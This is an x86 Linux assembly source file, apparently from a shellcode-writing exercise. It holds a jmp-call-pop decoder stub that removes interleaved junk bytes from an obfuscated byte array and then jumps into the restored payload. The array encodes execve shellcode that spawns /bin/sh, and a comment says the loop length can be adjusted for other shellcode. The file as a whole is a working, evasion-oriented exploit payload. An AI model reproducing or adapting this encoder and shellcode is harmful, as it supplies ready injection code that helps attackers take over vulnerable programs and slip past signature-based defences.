section .text
global _start
_start:
        jmp short end ; jmp pop call
 
decoder:
 
        xor eax, eax    ; clean up the registers
        xor ebx, ebx
        xor edx, edx
        xor ecx, ecx
 
        pop edx         ; get addr of shellcode putted by call starter
        push edx        ; backup for call :D
 
        mov esi, edx    ; mov shellcode start addr to esi (source)
        mov edi, edx    ; mov shellcode start addr to edi (destination)
        inc esi         ; point to the first dest byte, how many bytes we need to remove/espace
        inc edi         ; point to the first random number
        
        mov cl, 89      ; loop counter/your shellcode length, if you use diferent shellcode need adjust it
 
restore: ;decode
        xor eax, eax
        xor ebx, ebx
 
        mov al, byte [edi]  ; read distance to next byte
        add eax, edi        ; eax = addr of the next valid byte
 
        mov bl, byte [eax]  ; bl = next valid byte of the shellcode
        mov byte [esi], bl  ; move it to the final position
 
        mov edi, eax        ; put latest valid pisition into edi 
        inc edi             ; next distance
        inc esi             ; next valid byte
 
        loop restore        ; loop
        
        pop ecx             ; call shellcode
        call ecx            
 
        xor eax, eax        ; exit the shellcode (if it returns)
        mov al, 1           
        xor ebx,ebx         
        int 0x80            
 
end:
        call decoder  ; put shellcode addr into stack
        shelcode: db 0x31,0x01,0xc0,0x03,0x7a,0x6b,0x50,0x03,0x76,0x50,0x68,0x02,0x4f,0x62,0x03,0x6c,0x49,0x61,0x01,0x73,0x01,0x68,0x02,0x54,0x68,0x01,0x62,0x03,0x5e,0x7a,0x69,0x01,0x6e,0x01,0x2f,0x03,0x54,0x48,0x68,0x01,0x2f,0x03,0x47,0x4d,0x2f,0x01,0x2f,0x01,0x2f,0x01,0x89,0x03,0x4a,0x62,0xe3,0x01,0x50,0x02,0x42,0x89,0x02,0x63,0xe2,0x02,0x62,0x53,0x03,0x4f,0x41,0x89,0x01,0xe1,0x03,0x72,0x5b,0xb0,0x03,0x48,0x66,0x0b,0x02,0x61,0xcd,0x02,0x4f,0x80,0x03,0x41,0x4e